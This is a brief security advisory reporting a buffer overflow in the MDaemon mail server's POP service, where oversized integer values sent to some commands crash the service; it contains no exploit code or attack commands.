A buffer overflow vulnerability has been reported for MDaemon. The vulnerability is due to inadequate bounds checking on some POP server commands.

An attacker can exploit this vulnerability by submitting a very large integer value to some commands on the POP server. This will cause the MDaemon service to crash when attempting to process the command.
